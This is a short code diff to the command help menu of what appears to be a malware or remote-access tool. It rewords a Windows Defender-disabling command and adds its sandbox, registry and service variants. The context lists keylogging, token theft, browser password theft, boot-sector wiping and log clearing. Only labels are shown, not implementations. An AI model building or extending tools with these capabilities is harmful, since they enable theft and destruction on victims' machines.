@@ -61,7 +61,7 @@ commands = {'help': ['Show this help'],
             'openurl': ['Open a url in web browser'],
             'wallpaper': ['Change desktop background'],
             'hideme': ['Set hidden and system attributes'],
-            'killwd': ['Incapacitate Windows Defender'],
+            'killwd': ['Disable Windows Defender'],
             'killmbr': ['Overwrite boot sector'],
             'clearlog': ['Clear event logs'],
             'cleanup': ['Remove persistence and self delete']
@@ -378,7 +378,8 @@ class Helper:
         'keylogger': ['keylogger_start', 'keylogger_stop', 'keylogger_save'],
         'stealtoken': ['stealtoken_system', 'stealtoken_ti', 'stealtoken_admin', 'run_as_user', 'rus_as_admin'],
         'browser': ['get_passwords chrome', 'get_passwords edge', 'get_bookmarks chrome', 'get_bookmarks edge',
-                    'get_history chrome', 'get_history edge']
+                    'get_history chrome', 'get_history edge'],
+        'killwd': ['killwd_sandbox', 'killwd_registry', 'killwd_service']
     }
 
     @staticmethod
